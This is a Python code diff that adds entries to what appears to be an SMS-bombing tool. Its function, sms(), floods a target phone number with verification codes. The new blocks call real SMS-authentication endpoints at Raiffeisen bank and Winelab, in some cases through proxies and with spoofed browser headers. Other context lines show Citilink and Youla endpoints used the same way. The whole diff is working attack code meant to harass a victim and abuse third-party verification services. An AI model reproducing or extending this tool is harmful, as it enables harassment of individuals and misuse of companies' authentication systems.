@@ -157,6 +157,30 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					header = {
+						"Accept": "application/json, text/javascript, */*; q=0.01",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"dnt": "1",
+						"Host": "oapi.raiffeisen.ru",
+						"Origin": "https://www.raiffeisen.ru",
+						"Referer": "https://www.raiffeisen.ru/retail/cards/debit/cashback-card/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-site",
+						"sec-gpc": "1",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+					requests.get(f"https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number={number}", headers=header, proxies = proxies)
+					input('OK!')
+				except:
+					pass
+
+				try:
 					num = number
 					num2=""
 					num2+="+"
@@ -757,6 +781,33 @@ def sms(prx, number, tm, code):
 				except:
 					pass
 
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					payload = {
+						"number": num2
+					}
+					requests.get(f"https://www.winelab.ru/login/send/confirmationcode?number={num2}", data=payload, proxies = proxies)
+				except:
+					pass
+
 				try:			
 					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header, proxies = proxies)
 				except:
@@ -890,6 +941,57 @@ def sms(prx, number, tm, code):
 				try:
 					payload = {"phone": "+"+number}
 					requests.post("https://youla.ru/web-api/auth/request_code", data=payload)
+				except:
+					pass
+
+				try:
+					header = {
+						"Accept": "application/json, text/javascript, */*; q=0.01",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"dnt": "1",
+						"Host": "oapi.raiffeisen.ru",
+						"Origin": "https://www.raiffeisen.ru",
+						"Referer": "https://www.raiffeisen.ru/retail/cards/debit/cashback-card/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-site",
+						"sec-gpc": "1",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+					requests.get(f"https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number={number}", headers=header)
+					input('OK!')
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					payload = {
+						"number": num2
+					}
+					requests.get(f"https://www.winelab.ru/login/send/confirmationcode?number={num2}", data=payload)
 				except:
 					pass
 
